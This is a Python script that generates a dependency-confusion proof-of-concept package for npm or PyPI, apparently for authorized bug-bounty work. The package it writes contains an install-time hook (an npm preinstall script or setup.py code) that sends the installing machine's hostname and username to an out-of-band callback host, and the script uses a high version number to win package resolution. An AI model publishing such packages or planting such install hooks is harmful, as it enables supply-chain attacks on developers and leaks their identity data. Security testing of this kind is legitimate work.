#!/usr/bin/env python3
"""
benign_callback_pkg.py - GENERATE (never publish) a benign dependency-confusion PoC package skeleton (authorized only).

Writes a tiny, INERT package whose install hook makes ONE fire-and-forget callback to YOUR OOB host carrying only a token
+ hostname/username - the exact benign proof accepted by bug-bounty programs (Alex Birsan style). It does NOT publish,
does NOT run the beacon, contains NO reverse shell / NO data exfiltration / NO persistence. You review it, then (only for
a name in your AUTHORIZED scope) publish manually, catch the callback, and UNPUBLISH immediately. (DEPENDENCY_CONFUSION_TESTING_GUIDE.md §7-§8/§16.)

Usage:
  python3 benign_callback_pkg.py --ecosystem npm  --name @acme/config          --oob id.oast.fun --out ./poc_pkg
  python3 benign_callback_pkg.py --ecosystem pypi --name acme-internal-utils   --oob id.oast.fun --out ./poc_pkg
"""
import sys
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass
import argparse, json, os, secrets

NPM_BEACON = """// AUTHORIZED dependency-confusion PoC beacon - BENIGN.
// Does ONE fire-and-forget callback (token + hostname + username), then nothing.
// No data exfiltration, no shell, no file access, no persistence. UNPUBLISH this package right after the callback.
var os = require('os'), https = require('https');
try {{
  var who = (os.userInfo && os.userInfo().username) || '?';
  var id = encodeURIComponent(os.hostname() + '_' + who);
  https.get('https://{token}.{oob}/dc?pkg={qname}&h=' + id, function (r) {{}}).on('error', function (e) {{}});
}} catch (e) {{}}
"""

PY_SETUP = """# AUTHORIZED dependency-confusion PoC beacon - BENIGN.
# ONE fire-and-forget callback (token + hostname + username), then nothing. No exfil / shell / persistence.
# Yank/delete this release right after the callback.
import socket, getpass, urllib.request, urllib.parse
from setuptools import setup
try:
    ident = socket.gethostname() + "_" + getpass.getuser()
    urllib.request.urlopen("https://{token}.{oob}/dc?pkg={qname}&h=" + urllib.parse.quote(ident), timeout=5)
except Exception:
    pass
setup(
    name="{name}",
    version="{version}",
    description="AUTHORIZED dependency-confusion PoC - benign beacon - will be yanked",
)
"""


def main():
    ap = argparse.ArgumentParser(description="Generate a BENIGN dependency-confusion PoC package (does NOT publish).")
    ap.add_argument("--ecosystem", choices=["npm", "pypi"], required=True)
    ap.add_argument("--name", required=True, help="the internal package name (AUTHORIZED scope only)")
    ap.add_argument("--oob", required=True, help="YOUR interactsh/Collaborator host")
    ap.add_argument("--out", required=True, help="output directory to write the skeleton into")
    ap.add_argument("--token", default="", help="callback token (default: random)")
    ap.add_argument("--version", default="99.99.99", help="high version so resolution prefers this (default 99.99.99)")
    a = ap.parse_args()

    token = a.token or ("dc" + secrets.token_hex(4))
    qname = a.name.replace("/", "%2F")
    os.makedirs(a.out, exist_ok=True)
    written = []

    if a.ecosystem == "npm":
        pkg = {
            "name": a.name,
            "version": a.version,
            "description": "AUTHORIZED dependency-confusion PoC - benign beacon - will be unpublished",
            "scripts": {"preinstall": "node beacon.js"},
        }
        p1 = os.path.join(a.out, "package.json")
        open(p1, "w", encoding="utf-8").write(json.dumps(pkg, indent=2) + "\n")
        p2 = os.path.join(a.out, "beacon.js")
        open(p2, "w", encoding="utf-8").write(NPM_BEACON.format(token=token, oob=a.oob, qname=qname))
        written = [p1, p2]
    else:
        p1 = os.path.join(a.out, "setup.py")
        open(p1, "w", encoding="utf-8").write(
            PY_SETUP.format(token=token, oob=a.oob, qname=qname, name=a.name, version=a.version))
        p2 = os.path.join(a.out, "README.md")
        open(p2, "w", encoding="utf-8").write(f"# {a.name}\nAUTHORIZED dependency-confusion PoC - benign beacon. Will be yanked.\n")
        written = [p1, p2]

    print("== benign DC PoC package generated (NOT published) ==")
    print(f"[i] ecosystem: {a.ecosystem}   name: {a.name}   version: {a.version}")
    print(f"[i] beacon token: {token}   ->  watch https://{token}.{a.oob}/ on your OOB")
    for w in written:
        print(f"  wrote {w}")
    print()
    print("  !!  AUTHORIZED TARGETS ONLY  !!")
    print("  - Publish ONLY if this name is in YOUR authorized scope. Never claim a name you can't attribute to your target.")
    print("  - The beacon is BENIGN (token + hostname only). Do NOT add exfiltration / shells / persistence.")
    print("  - After the callback fires: UNPUBLISH / yank the release IMMEDIATELY, then report so they reserve the name/scope.")
    print(f"  - publish:  {'npm publish --access public' if a.ecosystem == 'npm' else 'python -m build && twine upload dist/*'}")
    print(f"  - unpublish:{' npm unpublish ' + a.name + '@' + a.version + ' --force' if a.ecosystem == 'npm' else ' delete/yank the release in the PyPI UI'}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
